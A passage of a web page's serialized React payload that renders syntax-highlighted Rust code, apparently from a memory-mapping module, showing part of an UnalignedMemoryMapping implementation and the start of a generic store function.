token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n4f4:[\"$\",\"span\",\"code-segment-381\",{\"className\":\"$u"])</script><script>self.__next_f.push([1,"ndefined\",\"style\":{},\"children\":[\"host_addr\"]}]\n4f5:[\"$\",\"span\",\"code-segment-382\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n4f6:[\"$\",\"span\",\"code-segment-383\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"replace\"]}]\n4f7:[\"$\",\"span\",\"code-segment-384\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4f8:[\"$\",\"span\",\"code-segment-385\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}]\n4f9:[\"$\",\"span\",\"code-segment-386\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4fa:[\"$\",\"span\",\"code-segment-387\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n4fb:[\"$\",\"span\",\"code-segment-388\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n4fc:[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[37]}]\n4fd:[\"$\",\"span\",\"code-segment-390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                region\"]}]\n4fe:[\"$\",\"span\",\"code-segment-391\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n4ff:[\"$\",\"span\",\"code-segment-392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}]\n500:[\"$\",\"span\",\"code-segment-393\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n501:[\"$\",\"span\",\"code-segment-394\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"replace\"]}]\n502:[\"$\",\"span\",\"code-segment-395\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n503:[\"$\",\"span\",\"code-segment-396\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\n504:[\"$\",\"span\",\"code-segment-397\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n505:[\"$\",\"span\",\"code-segment-398\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},"])</script><script>self.__next_f.push([1,"\"children\":[\"Writable\"]}]\n506:[\"$\",\"span\",\"code-segment-399\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n507:[\"$\",\"span\",\"code-segment-400\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n508:[\"$\",\"span\",\"code-segment-401\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n509:[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[38]}]\n50a:[\"$\",\"span\",\"code-segment-403\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n50b:[\"$\",\"span\",\"code-segment-404\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"true\"]}]\n50c:[\"$\",\"span\",\"code-segment-405\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n50d:[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[39]}]\n50e:[\"$\",\"span\",\"code-segment-407\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n50f:[\"$\",\"span\",\"code-segment-408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n510:[\"$\",\"span\",\"code-segment-409\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n511:[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[40]}]\n512:[\"$\",\"span\",\"code-segment-411\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n513:[\"$\",\"span\",\"code-segment-412\",{\"className\":\"token token\",\"s"])</script><script>self.__next_f.push([1,"tyle\":{\"color\":\"#f8c555\"},\"children\":[\"Err\"]}]\n514:[\"$\",\"span\",\"code-segment-413\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n515:[\"$\",\"span\",\"code-segment-414\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"_\"]}]\n516:[\"$\",\"span\",\"code-segment-415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n517:[\"$\",\"span\",\"code-segment-416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n518:[\"$\",\"span\",\"code-segment-417\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\n519:[\"$\",\"span\",\"code-segment-418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n51a:[\"$\",\"span\",\"code-segment-419\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\n51b:[\"$\",\"span\",\"code-segment-420\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n51c:[\"$\",\"span\",\"code-segment-421\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n51d:[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[41]}]\n51e:[\"$\",\"span\",\"code-segment-423\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n51f:[\"$\",\"span\",\"code-segment-424\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n520:[\"$\",\"span\",\"code-segment-425\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n521:[\"$\",\"span\",\"code-segment-426\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n522:[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[42]}]\n523:[\"$\",\"span\",\"code-segment-428\",{\"className\":\"$undefined\",\"sty"])</script><script>self.__next_f.push([1,"le\":{},\"children\":[\"        _ \"]}]\n524:[\"$\",\"span\",\"code-segment-429\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\n525:[\"$\",\"span\",\"code-segment-430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n526:[\"$\",\"span\",\"code-segment-431\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\n527:[\"$\",\"span\",\"code-segment-432\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n528:[\"$\",\"span\",\"code-segment-433\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n529:[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[43]}]\n52a:[\"$\",\"span\",\"code-segment-435\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n52b:[\"$\",\"span\",\"code-segment-436\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n52c:[\"$\",\"span\",\"code-segment-437\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n52d:[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[44]}]\n52e:[\"$\",\"span\",\"code-segment-439\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n52f:[\"$\",\"span\",\"code-segment-440\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n530:[\"$\",\"span\",\"code-segment-441\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n531:[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em"])</script><script>self.__next_f.push([1,"\"},\"children\":[45]}]\n532:[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[46]}]\n533:[\"$\",\"span\",\"code-segment-445\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n534:[\"$\",\"span\",\"code-segment-446\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"impl\"]}]\n535:[\"$\",\"span\",\"code-segment-447\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n536:[\"$\",\"span\",\"code-segment-448\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n537:[\"$\",\"span\",\"code-segment-449\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n538:[\"$\",\"span\",\"code-segment-450\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n539:[\"$\",\"span\",\"code-segment-451\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"UnalignedMemoryMapping\"]}]\n53a:[\"$\",\"span\",\"code-segment-452\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n53b:[\"$\",\"span\",\"code-segment-453\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n53c:[\"$\",\"span\",\"code-segment-454\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n53d:[\"$\",\"span\",\"code-segment-455\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n53e:[\"$\",\"span\",\"code-segment-456\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n53f:[\"$\",\"span\",\"code-segment-457\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n540:[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children"])</script><script>self.__next_f.push([1,"\":[47]}]\n541:[\"$\",\"span\",\"code-segment-459\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n542:[\"$\",\"span\",\"code-segment-460\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n543:[\"$\",\"span\",\"code-segment-461\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n544:[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[48]}]\n545:[\"$\",\"span\",\"code-segment-463\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n546:[\"$\",\"span\",\"code-segment-464\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n547:[\"$\",\"span\",\"code-segment-465\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n548:[\"$\",\"span\",\"code-segment-466\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}]\n549:[\"$\",\"span\",\"code-segment-467\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n54a:[\"$\",\"span\",\"code-segment-468\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"store\"]}]\n54b:[\"$\",\"span\",\"code-segment-469\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n54c:[\"$\",\"span\",\"code-segment-470\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"T\"]}]\n54d:[\"$\",\"span\",\"code-segment-471\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n54e:[\"$\",\"span\",\"code-segment-472\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n54f:[\"$\",\"span\",\"code-segment-473\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pod\"]}]\n550:[\"$\",\"span\",\"code-segment-474\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n551:[\"$\",\"span\",\"code-segment-475\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n552:[\"$\",\"span\",\"code-segment-476\",{\"className\":\"token token"])</script><script>self.__next_f.push([1,"\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n553:[\"$\",\"span\",\"code-segment-477\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n554:[\"$\",\"span\",\"code-segment-478\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n555:[\"$\",\"span\",\"code-segment-479\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" value\"]}]\n556:[\"$\",\"span\",\"code-segment-480\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n557:[\"$\",\"span\",\"code-segment-481\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n558:[\"$\",\"span\",\"code-segment-482\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"T\"]}]\n559:[\"$\",\"span\",\"code-segment-483\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n55a:[\"$\",\"span\",\"code-segment-484\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n55b:[\"$\",\"span\",\"code-segment-485\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n55c:[\"$\",\"span\",\"code-segment-486\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n55d:[\"$\",\"span\",\"code-segment-487\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n55e:[\"$\",\"span\",\"code-segment-488\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n55f:[\"$\",\"span\",\"code-segment-489\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n560:[\"$\",\"span\",\"code-segment-490\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n561:[\"$\",\"span\",\"code-segment-491\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" pc\"]}]\n562:[\"$\",\"span\",\"code-segment-492\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n563:[\"$\",\"span\",\"code-segment-493\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n564:[\"$\",\"span\",\"code-segment-494\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}]\n565:[\"$\",\"span\",\"code-segment-495\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n566:[\"$\",\"span\",\"code-segment-496\",{\"className\":\"$"])</script><script>self.__next_f.push([1,"undefined\",\"style\":{},\"children\":[\" \"]}]\n567:[\"$\",\"span\",\"code-segment-497\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\n568:[\"$\",\"span\",\"code-segment-498\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n569:[\"$\",\"span\",\"code-segment-499\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}]\n56a:[\"$\",\"span\",\"code-segment-500\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n56b:[\"$\",\"span\",\"code-segment-501\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n56c:[\"$\",\"span\",\"code-segment-502\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n56d:[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[49]}]\n56e:[\"$\",\"span\",\"code-segment-504\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n56f:[\"$\",\"span\",\"code-segment-505\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n570:[\"$\",\"span\",\"code-segment-506\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n571:[\"$\",\"span\",\"code-segment-507\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n572:[\"$\",\"span\",\"code-segment-508\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len \"]}]\n573:[\"$\",\"span\",\"code-segment-509\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n574:[\"$\",\"span\",\"code-segment-510\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n575:[\"$\",\"span\",\"code-segment-511\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\n576:[\"$\",\"span\",\"code-segment-512\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n577:[\"$\",\"span\",\"code-segment-513\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}]\n578:[\"$\",\"span\",\"code-segment-514\",{\"className"])</script><script>self.__next_f.push([1,"\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n579:[\"$\",\"span\",\"code-segment-515\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n57a:[\"$\",\"span\",\"code-segment-516\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"T\"]}]\n57b:[\"$\",\"span\",\"code-segment-517\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n57c:[\"$\",\"span\",\"code-segment-518\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n57d:[\"$\",\"span\",\"code-segment-519\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n57e:[\"$\",\"span\",\"code-segment-520\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n57f:[\"$\",\"span\",\"code-segment-521\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n580:[\"$\",\"span\",\"code-segment-522\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n581:[\"$\",\"span\",\"code-segment-523\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n582:[\"$\",\"span\",\"code-segment-524\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n583:[\"$\",\"span\",\"code-segment-525\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n584:[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[50]}]\n585:[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[51]}]\n586:[\"$\",\"span\",\"code-segment-529\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n587:[\"$\",\"span\",\"code-segment-530\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n588:[\"$\",\""])</script><script>self.__next_f.push([1,"span\",\"code-segment-531\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache \"]}]\n589:[\"$\",\"span\",\"code-segment-532\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n58a:[\"$\",\"span\",\"code-segment-533\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n58b:[\"$\",\"span\",\"code-segment-534\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\n58c:[\"$\",\"span\",\"code-segment-535\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n58d:[\"$\",\"span\",\"code-segment-536\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n58e:[\"$\",\"span\",\"code-segment-537\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n58f:[\"$\",\"span\",\"code-segment-538\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n590:[\"$\",\"span\",\"code-segment-539\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n591:[\"$\",\"span\",\"code-segment-540\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n592:[\"$\",\"span\",\"code-segment-541\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n593:[\"$\",\"span\",\"code-segment-542\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n594:[\"$\",\"span\",\"code-segment-543\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n595:[\"$\",\"span\",\"code-segment-544\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}]\n596:[\"$\",\"span\",\"code-segment-545\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n597:[\"$\",\"span\",\"code-segment-546\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}]\n598:[\"$\",\"span\",\"code-segment-547\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n599:[\"$\",\"span\",\"code-segment-548\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n59a:[\"$\",\"span\",\"code-segment-549\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n59b:[\"$\",\"span\",\"code-segment-550\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n"])</script><script>self.__next_f.push([1,"59c:[\"$\",\"span\",\"code-segment-551\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n59d:[\"$\",\"span\",\"code-segment-552\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n59e:[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[52]}]\n59f:[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[53]}]\n5a0:[\"$\",\"span\",\"code-segment-556\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n5a1:[\"$\",\"span\",\"code-segment-557\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n5a2:[\"$\",\"span\",\"code-segment-558\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5a3:[\"$\",\"span\",\"code-segment-559\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n5a4:[\"$\",\"span\",\"code-segment-560\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" src \"]}]\n5a5:[\"$\",\"span\",\"code-segment-561\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n5a6:[\"$\",\"span\",\"code-segment-562\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5a7:[\"$\",\"span\",\"code-segment-563\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n5a8:[\"$\",\"span\",\"code-segment-564\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"value \"]}]\n5a9:[\"$\",\"span\",\"code-segment-565\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n5aa:[\"$\",\"span\",\"code-segment-566\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5ab:[\"$\",\"span\",\"code-segment-567\",{\"className\":\"token 